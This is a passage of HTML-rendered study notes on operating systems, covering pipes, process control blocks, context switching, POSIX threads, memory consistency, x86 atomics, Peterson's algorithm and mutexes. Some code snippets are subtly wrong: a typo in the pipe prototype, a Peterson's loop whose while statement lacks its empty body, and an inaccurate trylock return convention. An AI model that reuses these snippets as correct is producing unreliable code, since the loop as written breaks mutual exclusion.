&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pipe&lt;/span&gt;(it fds[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// returns two file descriptors in fds[0] and fds[1]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// writes to fds[1] will be read on fds[0]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// fds[0] returns EOF after last copy of fds[1] closes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// -1 is error, 0 is success
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;pipesh.c&lt;/p&gt;
&lt;p&gt;Use dup2 to read from the pipe[1] and write from the pipe[0] while maintaining the stdout and stdin. stderr is 2.&lt;/p&gt;
&lt;h3 id=&#34;implementing-processes&#34; &gt;Implementing Processes
&lt;span&gt;
    &lt;a href=&#34;#implementing-processes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Process Control Block (PCB) is kept for each process&lt;/li&gt;
&lt;li&gt;&lt;code&gt;proc&lt;/code&gt; in Unix, &lt;code&gt;task_struct&lt;/code&gt; in Linux, &lt;code&gt;struct thread&lt;/code&gt; in OS/161&lt;/li&gt;
&lt;li&gt;Tracks state of process
&lt;ul&gt;
&lt;li&gt;new and terminated at beginning &amp;amp; end of life&lt;/li&gt;
&lt;li&gt;running&lt;/li&gt;
&lt;li&gt;ready - can run, but kernel has chosen different process to run&lt;/li&gt;
&lt;li&gt;waiting&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Information necessary to run (registers, virtual memory mapping, etc, open files)&lt;/li&gt;
&lt;li&gt;Other data like credentials, signal mask, controlling terminal, priority, accounting stats, debugged, binary emulation, &amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;context-switch&#34; &gt;Context Switch
&lt;span&gt;
    &lt;a href=&#34;#context-switch&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Saving program counter and integer registers (Always)&lt;/li&gt;
&lt;li&gt;Special registers&lt;/li&gt;
&lt;li&gt;Condition codes&lt;/li&gt;
&lt;li&gt;Change virtual address translations&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Non-negligible cost&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Save/restore floating point registers expensive&lt;/li&gt;
&lt;li&gt;Flushing TLB (memory translation hardware)
&lt;ul&gt;
&lt;li&gt;HW Optimization 1: Don&amp;rsquo;t flush kernel&amp;rsquo;s own data from TLB&lt;/li&gt;
&lt;li&gt;HW Optimization 2: use tag to avoid flushing any data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache misses&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;threads&#34; &gt;Threads
&lt;span&gt;
    &lt;a href=&#34;#threads&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Multi-threaded programs share the address space.&lt;/li&gt;
&lt;li&gt;Typically one kernel thread for every process&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;posix-thread-api&#34; &gt;POSIX Thread API
&lt;span&gt;
    &lt;a href=&#34;#posix-thread-api&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// create a new thread identified by thr with optional attributes, run fn with arg
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_create&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_t&lt;/span&gt; *thr, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_attr_t&lt;/span&gt; *attr, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *(*fn)(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *), &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *arg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// destroy current thread and return a pointer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_exit&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *return_value);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Wait for thread thread to exit and receive the return value
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_join&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_t&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;thread&lt;/span&gt;, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; **return_value);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// tell the OS scheduler to run another thread or process
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_yield&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and more&lt;/p&gt;
&lt;h3 id=&#34;limitations-of-kernel-threads&#34; &gt;Limitations of Kernel Threads
&lt;span&gt;
    &lt;a href=&#34;#limitations-of-kernel-threads&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;syscalls take 100 cycles, function calls take 2 cycles&lt;/li&gt;
&lt;li&gt;fixed-size stack within kernel&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;go-language-routines&#34; &gt;Go Language Routines
&lt;span&gt;
    &lt;a href=&#34;#go-language-routines&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;lightweight, 100k go routines is practical&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;implementing-threads-in-os161&#34; &gt;Implementing threads in OS/161
&lt;span&gt;
    &lt;a href=&#34;#implementing-threads-in-os161&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;thread_fork&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *name, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; proc *proc,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; (*entrypoint)(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *data1, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; data2), &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *data1, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; data2)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// wrapper for pthread_create wrapper, does not call process fork
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;concurrency&#34; &gt;Concurrency
&lt;span&gt;
    &lt;a href=&#34;#concurrency&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Data races occur without synchronization&lt;/p&gt;
&lt;p&gt;Options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Atomic instructions: instantaneously modify a value&lt;/li&gt;
&lt;li&gt;Locks: prevent concurrent execution&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sequential-consistency&#34; &gt;Sequential Consistency
&lt;span&gt;
    &lt;a href=&#34;#sequential-consistency&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Execution as if all operations were executed in some sequential order and that the operations of each  processor occurred in the order specified by the program.&lt;/p&gt;
&lt;p&gt;Requirements for sequential consistency are maintaining program order on individual processors and ensuring writes are atomic.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sequential consistency complicates write buffers since CPUs use many caches.&lt;/li&gt;
&lt;li&gt;We want to group writes to the same location (coalescing)&lt;/li&gt;
&lt;li&gt;Complicates non-blocking reads&lt;/li&gt;
&lt;li&gt;Thwarting of compiler optimizations&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Does not solve the problem of atomicity since modifying a value is 3 lines of code.&lt;/p&gt;
&lt;h3 id=&#34;x86-consistency&#34; &gt;x86 Consistency
&lt;span&gt;
    &lt;a href=&#34;#x86-consistency&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Different choice for how to write like (cache, write cache and memory, write to memory only, uncacheable).&lt;/p&gt;
&lt;h3 id=&#34;x86-atomicity&#34; &gt;x86 Atomicity
&lt;span&gt;
    &lt;a href=&#34;#x86-atomicity&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lock&lt;/code&gt; - prefix to make a memory instruction atomic (locks bus for duration of instruction)
&lt;ul&gt;
&lt;li&gt;can avoid locking if memory already exclusively cached&lt;/li&gt;
&lt;li&gt;all lock instructions totally ordered&lt;/li&gt;
&lt;li&gt;other memory instructions cannot be re-ordered w. locked ones&lt;/li&gt;
&lt;li&gt;locks are always ordered&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xchg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cmpxchg&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lfence&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sfence&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mfence&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;petersons-solution&#34; &gt;Peterson&amp;rsquo;s Solution
&lt;span&gt;
    &lt;a href=&#34;#petersons-solution&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Assuming sequential consistency&lt;/li&gt;
&lt;li&gt;Assume two threads&lt;/li&gt;
&lt;li&gt;&lt;code&gt;int not_turn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bool wants[2]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (;;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  wants[i] = &lt;span style=&#34;color:#24909d&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  not_turn = i;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt;(wants[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;-i] &amp;amp;&amp;amp; not_turn == i)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// other thread wants in and not our turn
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;Critical_section&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  wants[i] = &lt;span style=&#34;color:#24909d&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;Remainder_section&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;mutexes&#34; &gt;Mutexes
&lt;span&gt;
    &lt;a href=&#34;#mutexes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;A mutex is a mutual exclusion lock. Thread packages typically provide &lt;em&gt;mutexes&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_mutex_init&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_mutex_t&lt;/span&gt;  *m, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_mutexattr_t&lt;/span&gt; attr);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_mutex_destroy&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_mutex_t&lt;/span&gt; *m)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_mutex_lock&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_mutex_t&lt;/span&gt;  *m);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_mutex_unlock&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_mutex_t&lt;/span&gt; *m)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// return 0 if successful, otherwise -1 (errno == EBUSY)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;pthread_mutex_trylock&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;pthread_mutex_t&lt;/span&gt;  *m);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Only one thread acquires m at a time, others wait. All global data should be protected by a mutex. If mutexes are used properly, then we get behavior equivalent to sequential consistency.&lt;/p&gt;
&lt;p&gt;Want to wrap all shared memory writes with a mutex lock and unlock.&lt;/p&gt;
